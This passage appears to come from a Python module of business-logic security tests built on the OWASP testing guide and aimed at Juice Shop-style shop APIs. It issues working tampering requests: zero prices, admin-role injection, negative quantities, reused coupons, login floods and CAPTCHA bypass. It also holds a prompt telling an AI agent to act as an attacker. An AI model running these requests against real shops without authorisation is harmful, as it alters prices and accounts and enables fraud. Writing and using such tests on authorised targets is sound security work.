            "status": "success",
            "data": {
                "vulnerable": len(findings) > 0,
                "findings": findings,
                "tests_performed": 6,
                "description": "Shopping cart business logic testing for e-commerce vulnerabilities"
            }
        }

    except Exception as e:
        return {"status": "error", "message": f"Shopping cart testing failed: {e}"}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_integrity_checks(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    WSTG-BUSL-03: Test Integrity Checks.
    Tests whether the application validates data integrity — e.g., can a user
    tamper with prices, quantities, or hidden form values to bypass business rules?
    """
    try:
        findings = []
        base = url.rstrip('/')

        req_kwargs = {"timeout": 15, "verify": False, "follow_redirects": True}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}

        async with httpx.AsyncClient(**req_kwargs) as client:
            # Test 1: Price tampering via API
            product_endpoints = [
                f"{base}/api/Products/1", f"{base}/api/products/1",
                f"{base}/rest/products/1/reviews",
            ]
            for ep in product_endpoints:
                try:
                    resp = await client.get(ep)
                    if resp.status_code == 200:
                        data = resp.json()
                        # Try to modify price
                        tamper_resp = await client.put(ep, json={"price": 0.01})
                        if tamper_resp.status_code in (200, 201):
                            findings.append({
                                "type": "price_tampering",
                                "endpoint": ep,
                                "severity": "Critical",
                                "description": "Price can be modified via API request",
                                "evidence": f"PUT {ep} with price=0.01 returned {tamper_resp.status_code}"
                            })
                except Exception:
                    continue

            # Test 2: Quantity manipulation (negative, zero, extreme)
            basket_endpoints = [
                f"{base}/api/BasketItems/", f"{base}/rest/basket/1",
                f"{base}/api/cart",
            ]
            tamper_quantities = [
                (-1, "negative_quantity"),
                (0, "zero_quantity"),
                (999999, "extreme_quantity"),
            ]
            for ep in basket_endpoints:
                for qty, label in tamper_quantities:
                    try:
                        resp = await client.post(ep, json={"ProductId": 1, "BasketId": "1", "quantity": qty})
                        if resp.status_code in (200, 201):
                            findings.append({
                                "type": f"quantity_tampering_{label}",
                                "endpoint": ep,
                                "quantity": qty,
                                "severity": "High",
                                "description": f"Application accepted {label} ({qty})",
                                "evidence": f"POST {ep} with quantity={qty} returned {resp.status_code}"
                            })
                    except Exception:
                        continue

            # Test 3: Hidden field / parameter tampering
            tamper_params = [
                {"role": "admin"}, {"isAdmin": True}, {"discount": 100},
                {"total": 0}, {"status": "completed"}, {"verified": True},
            ]
            user_endpoints = [
                f"{base}/api/Users/1", f"{base}/api/user/profile",
                f"{base}/rest/user/change-password",
            ]
            for ep in user_endpoints:
                for params in tamper_params:
                    try:
                        resp = await client.put(ep, json=params)
                        if resp.status_code in (200, 201):
                            resp_body = resp.text[:200]
                            param_name = list(params.keys())[0]
                            if param_name in resp_body.lower():
                                findings.append({
                                    "type": "hidden_field_tampering",
                                    "endpoint": ep,
                                    "parameter": params,
                                    "severity": "Critical",
                                    "description": f"Server accepted tampered parameter: {param_name}",
                                    "evidence": resp_body
                                })
                    except Exception:
                        continue

        return {"status": "success", "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "tests_performed": 3,
            "description": "Integrity check failures allow price tampering, quantity manipulation, and privilege escalation"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_application_misuse_defenses(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    WSTG-BUSL-07: Test Defenses Against Application Misuse.
    Checks if the application detects and responds to abuse patterns
    like rapid requests, automated form submissions, or brute-force attempts.
    """
    try:
        import time
        findings = []
        base = url.rstrip('/')

        req_kwargs = {"timeout": 10, "verify": False, "follow_redirects": True}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}

        async with httpx.AsyncClient(**req_kwargs) as client:
            # Test 1: Rapid request flood (limited burst)
            test_endpoints = [
                f"{base}/rest/user/login",
                f"{base}/api/Users/",
                f"{base}/rest/products/search?q=test",
            ]
            for ep in test_endpoints:
                try:
                    statuses = []
                    for _ in range(10):
                        resp = await client.get(ep)
                        statuses.append(resp.status_code)
                    # If all 10 succeeded with 200, no rate limiting
                    if all(s == 200 for s in statuses):
                        findings.append({
                            "type": "no_rate_limiting",
                            "endpoint": ep,
                            "severity": "Medium",
                            "description": f"No rate limiting on {ep} after 10 rapid requests",
                            "evidence": f"All 10 requests returned 200"
                        })
                except Exception:
                    continue

            # Test 2: Failed login flood (brute-force detection)
            login_endpoints = [
                f"{base}/rest/user/login",
                f"{base}/api/login",
                f"{base}/login",
            ]
            for ep in login_endpoints:
                try:
                    blocked = False
                    for i in range(8):
                        resp = await client.post(ep, json={
                            "email": f"bruteforce{i}@test.com",
                            "password": "wrongpass"
                        })
                        if resp.status_code == 429:
                            blocked = True
                            break
                    if not blocked:
                        findings.append({
                            "type": "no_brute_force_protection",
                            "endpoint": ep,
                            "severity": "High",
                            "description": "No account lockout or rate limiting after multiple failed logins",
                            "evidence": "8 failed login attempts without being blocked"
                        })
                except Exception:
                    continue

            # Test 3: CAPTCHA / bot detection
            form_endpoints = [
                f"{base}/api/Feedbacks/",
                f"{base}/api/Complaints/",
                f"{base}/contact",
            ]
            for ep in form_endpoints:
                try:
                    submissions = 0
                    for i in range(5):
                        resp = await client.post(ep, json={
                            "comment": f"Automated test {i}",
                            "rating": 1,
                            "captcha": "",
                            "captchaId": 0,
                        })
                        if resp.status_code in (200, 201):
                            submissions += 1
                    if submissions >= 3:
                        findings.append({
                            "type": "no_captcha_protection",
                            "endpoint": ep,
                            "severity": "Medium",
                            "description": f"Form accepts automated submissions without CAPTCHA ({submissions}/5 succeeded)",
                        })
                except Exception:
                    continue

        return {"status": "success", "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "tests_performed": 3,
            "description": "Missing abuse defenses allow brute-force, scraping, and automated attacks"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def test_captcha_and_rate_limit(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    WSTG-BUSL-05: Test CAPTCHA bypass and rate limiting abuse.
    Sends rapid requests to key endpoints to detect missing rate limiting (HTTP 429)
    and tests whether forms can be submitted without a valid CAPTCHA field.
    """
    try:
        findings = []
        base = url.rstrip('/')

        req_kwargs = {"timeout": 10.0, "verify": False, "follow_redirects": True}
        if auth_session:
            if 'cookies' in auth_session:
                req_kwargs['cookies'] = auth_session['cookies']
            if 'headers' in auth_session:
                req_kwargs['headers'] = auth_session.get('headers', {})
            elif 'token' in auth_session:
                req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}

        async with httpx.AsyncClient(**req_kwargs) as client:
            # ── Test 1: Missing rate limiting on key endpoints ──
            rate_limit_targets = [
                {"path": "/rest/user/login", "method": "POST",
                 "body": {"email": "ratelimit@test.com", "password": "wrongpass"},
                 "label": "Login brute force"},
                {"path": "/api/Users", "method": "POST",
                 "body": {"email": "spam@test.com", "password": "Spam1234!", "passwordRepeat": "Spam1234!",
                          "securityQuestion": {"id": 1, "question": "Name?"}, "securityAnswer": "x"},
                 "label": "Registration spam"},
                {"path": "/api/Feedbacks", "method": "POST",
                 "body": {"comment": "rate limit test", "rating": 1, "captcha": "", "captchaId": 0},
                 "label": "Feedback spam"},
                {"path": "/api/Complaints", "method": "POST",
                 "body": {"message": "rate limit test"},
                 "label": "Complaint spam"},
                {"path": "/rest/products/search?q=apple", "method": "GET",
                 "body": None,
                 "label": "Search abuse"},
            ]

            REQUEST_COUNT = 15

            for target in rate_limit_targets:
                ep = f"{base}{target['path']}"
                try:
                    statuses = []
                    rate_limited = False
                    captcha_seen = False

                    for i in range(REQUEST_COUNT):
                        if target["method"] == "POST" and target["body"]:
                            resp = await client.post(ep, json=target["body"])
                        else:
                            resp = await client.get(ep)

                        statuses.append(resp.status_code)

                        # Detect rate limiting
                        if resp.status_code == 429:
                            rate_limited = True
                            break

                        # Detect CAPTCHA challenge in response body
                        body_text = resp.text.lower() if resp.text else ""
                        if "captcha" in body_text and ("challenge" in body_text or "verify" in body_text):
                            captcha_seen = True
                            rate_limited = True
                            break

                    if not rate_limited:
                        success_count = sum(1 for s in statuses if s in (200, 201, 401, 402))
                        severity = "high" if target["label"] == "Login brute force" else "medium"
                        findings.append({
                            "type": f"no_rate_limiting_{target['label'].lower().replace(' ', '_')}",
                            "endpoint": ep,
                            "severity": severity,
                            "description": (
                                f"No rate limiting on {target['label']}: "
                                f"{REQUEST_COUNT} rapid requests sent, "
                                f"{success_count} processed without throttling"
                            ),
                            "evidence": {
                                "requests_sent": REQUEST_COUNT,
                                "status_codes": statuses,
                                "rate_limited": False,
                                "captcha_challenged": False,
                            }
                        })
                except Exception:
                    continue

            # ── Test 2: CAPTCHA bypass — submit forms without CAPTCHA field ──
            captcha_form_targets = [
                {"path": "/api/Feedbacks", "label": "Feedback form",
                 "with_captcha": {"comment": "captcha test", "rating": 3, "captcha": "12345", "captchaId": 1},
                 "without_captcha": {"comment": "captcha bypass test", "rating": 3}},
                {"path": "/api/Complaints", "label": "Complaint form",
                 "with_captcha": {"message": "captcha test", "captcha": "12345", "captchaId": 1},
                 "without_captcha": {"message": "captcha bypass test"}},
                {"path": "/api/Users", "label": "Registration form",
                 "with_captcha": {"email": "captchatest@test.com", "password": "Captcha1234!",
                                  "passwordRepeat": "Captcha1234!",
                                  "securityQuestion": {"id": 1, "question": "Name?"}, "securityAnswer": "x",
                                  "captcha": "12345", "captchaId": 1},
                 "without_captcha": {"email": "nocaptcha@test.com", "password": "NoCaptcha1234!",
                                     "passwordRepeat": "NoCaptcha1234!",
                                     "securityQuestion": {"id": 1, "question": "Name?"}, "securityAnswer": "x"}},
            ]

            for target in captcha_form_targets:
                ep = f"{base}{target['path']}"
                try:
                    # Submit WITH bogus CAPTCHA values
                    resp_with = await client.post(ep, json=target["with_captcha"])
                    # Submit WITHOUT CAPTCHA field at all
                    resp_without = await client.post(ep, json=target["without_captcha"])

                    with_status = resp_with.status_code
                    without_status = resp_without.status_code

                    # If form accepts submission without CAPTCHA (2xx response)
                    if without_status in (200, 201):
                        findings.append({
                            "type": "captcha_bypass",
                            "endpoint": ep,
                            "severity": "medium",
                            "description": (
                                f"CAPTCHA bypass on {target['label']}: "
                                f"form accepted without CAPTCHA field (HTTP {without_status})"
                            ),
                            "evidence": {
                                "with_captcha_status": with_status,
                                "without_captcha_status": without_status,
                                "captcha_required": False,
                            }
                        })

                    # If form accepts bogus CAPTCHA values (no validation)
                    if with_status in (200, 201):
                        findings.append({
                            "type": "captcha_not_validated",
                            "endpoint": ep,
                            "severity": "medium",
                            "description": (
                                f"CAPTCHA not validated on {target['label']}: "
                                f"bogus captcha value accepted (HTTP {with_status})"
                            ),
                            "evidence": {
                                "bogus_captcha_status": with_status,
                                "captcha_validated": False,
                            }
                        })
                except Exception:
                    continue

            # ── Test 3: Empty CAPTCHA field accepted ──
            empty_captcha_targets = [
                {"path": "/api/Feedbacks",
                 "body": {"comment": "empty captcha", "rating": 2, "captcha": "", "captchaId": 0}},
            ]
            for target in empty_captcha_targets:
                ep = f"{base}{target['path']}"
                try:
                    resp = await client.post(ep, json=target["body"])
                    if resp.status_code in (200, 201):
                        findings.append({
                            "type": "empty_captcha_accepted",
                            "endpoint": ep,
                            "severity": "medium",
                            "description": (
                                f"Empty CAPTCHA accepted on {ep}: "
                                f"submitted with empty captcha string (HTTP {resp.status_code})"
                            ),
                            "evidence": {
                                "empty_captcha_status": resp.status_code,
                            }
                        })
                except Exception:
                    continue

        vuln_count = len(findings)
        return {"status": "success", "data": {
            "vulnerable": vuln_count > 0,
            "findings": findings,
            "vulnerabilities_found": vuln_count,
            "tests_performed": 3,
            "description": "CAPTCHA bypass and rate limiting abuse testing per WSTG-BUSL-05"
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def test_coupon_forgery(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Test coupon code abuse, negative pricing, and discount manipulation (WSTG-BUSL-09)."""
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        if auth_session:
            if auth_session.get("token"):
                headers["Authorization"] = f"Bearer {auth_session['token']}"
            if auth_session.get("cookies"):
                headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in auth_session["cookies"].items())

        findings = []

        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True, headers=headers) as client:
            # 1. Test known/expired coupon codes (Juice Shop z85-encoded dates)
            known_coupons = [
                "n<MibgC7sn",   # Expired coupon
                "o*IVqtMzMt",   # Expired coupon
                "mNYS7Dxo40",   # Common test coupon
                "WMNSUVHFJB",   # Brute force attempt
                "TEST123",
                "DISCOUNT10",
            ]
            for basket_id in range(1, 6):
                for coupon in known_coupons:
                    try:
                        resp = await client.put(
                            f"{base_url}/rest/basket/{basket_id}/coupon/{coupon}",
                            json={"couponCode": coupon}
                        )
                        if resp.status_code == 200 and ("discount" in resp.text.lower() or resp.status_code == 200):
                            try:
                                body = resp.json()
                                if body.get("data") or "discount" in str(body).lower():
                                    findings.append({
                                        "type": "Expired/known coupon accepted",
                                        "endpoint": f"/rest/basket/{basket_id}/coupon/{coupon}",
                                        "severity": "high",
                                        "description": f"Coupon '{coupon}' accepted on basket {basket_id}",
                                        "evidence": str(body)[:200]
                                    })
                                    break  # One finding per basket is enough
                            except Exception:
                                pass
                    except Exception:
                        continue

            # 2. Test negative quantity manipulation
            for basket_id in range(1, 4):
                for item_id in range(1, 6):
                    try:
                        resp = await client.put(
                            f"{base_url}/api/BasketItems/{item_id}",
                            json={"quantity": -1}
                        )
                        if resp.status_code == 200:
                            try:
                                body = resp.json()
                                if body.get("data") or body.get("status") == "success":
                                    findings.append({
                                        "type": "Negative quantity accepted",
                                        "endpoint": f"/api/BasketItems/{item_id}",
                                        "severity": "critical",
                                        "description": "Negative quantity accepted - potential credit generation",
                                        "evidence": str(body)[:200]
                                    })
                                    break
                            except Exception:
                                pass
                    except Exception:
                        continue

            # 3. Test zero/negative price via direct product manipulation
            for product_id in range(1, 6):
                try:
                    resp = await client.put(
                        f"{base_url}/api/Products/{product_id}",
                        json={"price": 0}
                    )
                    if resp.status_code == 200:
                        try:
                            body = resp.json()
                            if body.get("data"):
                                findings.append({
                                    "type": "Price manipulation to zero",
                                    "endpoint": f"/api/Products/{product_id}",
                                    "severity": "critical",
                                    "description": "Product price set to 0 via direct API call",
                                    "evidence": str(body)[:200]
                                })
                                break
                        except Exception:
                            pass
                except Exception:
                    continue

            # 4. Test coupon reuse (apply same coupon twice)
            for basket_id in range(1, 4):
                try:
                    coupon = "n<MibgC7sn"
                    resp1 = await client.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon}")
                    resp2 = await client.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon}")
                    if resp1.status_code == 200 and resp2.status_code == 200:
                        findings.append({
                            "type": "Coupon reuse allowed",
                            "endpoint": f"/rest/basket/{basket_id}/coupon",
                            "severity": "high",
                            "description": "Same coupon code can be applied multiple times",
                            "evidence": f"First: {resp1.status_code}, Second: {resp2.status_code}"
                        })
                        break
                except Exception:
                    continue

            # 5. Test Quantitys endpoint exposure (data leak)
            try:
                resp = await client.get(f"{base_url}/api/Quantitys")
                if resp.status_code == 200:
                    try:
                        body = resp.json()
                        if body.get("data") and len(body["data"]) > 0:
                            findings.append({
                                "type": "Quantity data exposed",
                                "endpoint": "/api/Quantitys",
                                "severity": "medium",
                                "description": f"Internal quantity data exposed ({len(body['data'])} records)",
                                "evidence": str(body["data"][:2])[:200]
                            })
                    except Exception:
                        pass
            except Exception:
                pass

        return {"status": "success", "data": {
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "vulnerabilities_found": len(findings)
        }}
    except Exception as e:
        return {"status": "error", "message": str(e)}


# --- Prompt ---
# @mcp.prompt()  # REMOVED: Using JSON-RPC adapter
def setup_prompt(domainname: str) -> str:
    return f"""
You are an expert penetration tester specialising in **business-logic flaws**.  
Your mission is to probe **{domainname}** for logic and workflow vulnerabilities per OWASP WSTG 4.10.

**Strategy:**
1.  **Map Workflows:** First, manually or using a browser controller, understand the key business processes: registration, login, shopping cart, user profile update, etc.
2.  **Test Data & Price Logic:** On transaction-related endpoints, use `test_data_validation_extremes` and look for opportunities to tamper with price or quantity parameters.
3.  **Test for Privilege/State Manipulation:** On endpoints that modify user data (e.g., `/api/user/update`), use `test_mass_assignment` to try and inject privileged fields like `isAdmin` or `role`.
4.  **Test Concurrency & Limits:** Use `test_process_timing_race_condition` on functions that should only be executed once (e.g., applying a coupon) and `test_usage_limits_burst` on functions that should be rate-limited (e.g., sending a message).
5.  **Test File Uploads:** Use the `test_file_upload_logic` tool with various malicious/unexpected file types.
6.  **Consult Checklists:** Use `get_manual_checklist` for complex, context-heavy tests.

Your goal is to subvert the application's intended logic. Think like an attacker trying to get a product for free, elevate their privileges, or bypass a payment step.
"""

# if __name__ == "__main__":  # REMOVED: Using JSON-RPC adapter`n#     mcp.run(transport="stdio")

